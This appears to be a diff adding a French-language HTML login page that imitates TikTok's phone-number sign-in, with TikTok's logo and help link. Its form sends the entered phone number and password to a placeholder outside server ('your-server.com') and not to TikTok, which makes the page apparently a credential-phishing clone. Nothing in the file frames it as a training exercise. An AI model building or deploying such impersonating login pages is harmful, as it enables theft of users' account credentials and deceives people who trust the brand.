@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion avec un numéro de téléphone</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"> <!-- Lien vers Font Awesome -->
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: white;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            position: relative;
+        }
+
+        .logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 100px;
+            height: auto;
+        }
+
+        .help-link {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 0.9rem;
+        }
+
+        .help-link a {
+            color: #fff;
+            text-decoration: none;
+        }
+
+        .help-link a:hover {
+            text-decoration: underline;
+        }
+
+        .container {
+            max-width: 400px;
+            background-color: #fff;
+            color: #000;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .container h2 {
+            color: #000;
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+        }
+
+        .container form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .container form input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+
+        .container form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #000;
+            color: white;
+            font-size: 1rem;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .container form button:hover {
+            background-color: #333;
+        }
+
+        .back-link {
+            margin-top: 20px;
+            font-size: 0.9rem;
+        }
+
+        .back-link a {
+            color: #666;
+            text-decoration: none;
+        }
+
+        .back-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* Style pour la zone du mot de passe avec l'icône de l'œil */
+        .password-container {
+            position: relative;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
+        .password-input {
+            width: calc(100% - 15px); /* Réduit la largeur pour déplacer à gauche */
+            padding: 10px;
+            padding-right: 30px; /* Laisse de l'espace pour l'icône à droite */
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1rem;
+            margin-left: -10px; /* Déplace la zone du mot de passe 5px à droite */
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 10px; /* Décale l'icône de l'œil à droite */
+            top: 50%; /* Centre verticalement */
+            transform: translateY(-50%); /* Centrage parfait */
+            cursor: pointer;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body>
+    <img src="TikTok_logo.svg.png" alt="Logo TikTok" class="logo">
+    <div class="help-link">
+        <a href="#">Commentaires et assistance</a>
+    </div>
+    <div class="container">
+        <h2>Connexion avec un numéro de téléphone</h2>
+        <form action="https://your-server.com/handle-phone-login" method="POST">
+            <input type="tel" name="phone" placeholder="Numéro de téléphone" required>
+            <div class="password-container">
+                <input type="password" name="password" id="password" class="password-input" placeholder="Mot de passe" required>
+                <i class="fas fa-eye" id="eye-icon" onclick="togglePassword()"></i>
+            </div>
+            <button type="submit">Se connecter</button>
+        </form>
+        <div class="back-link">
+            <a href="test.html">Retour à la page de connexion</a>
+        </div>
+    </div>
+
+    <script>
+        // Fonction pour afficher/masquer le mot de passe
+        function togglePassword() {
+            const passwordInput = document.getElementById("password");
+            const eyeIcon = document.getElementById("eye-icon");
+
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                eyeIcon.classList.remove("fa-eye");
+                eyeIcon.classList.add("fa-eye-slash"); // Icône œil barré
+            } else {
+                passwordInput.type = "password";
+                eyeIcon.classList.remove("fa-eye-slash");
+                eyeIcon.classList.add("fa-eye"); // Icône œil
+            }
+        }
+    </script>
+</body>
+</html>
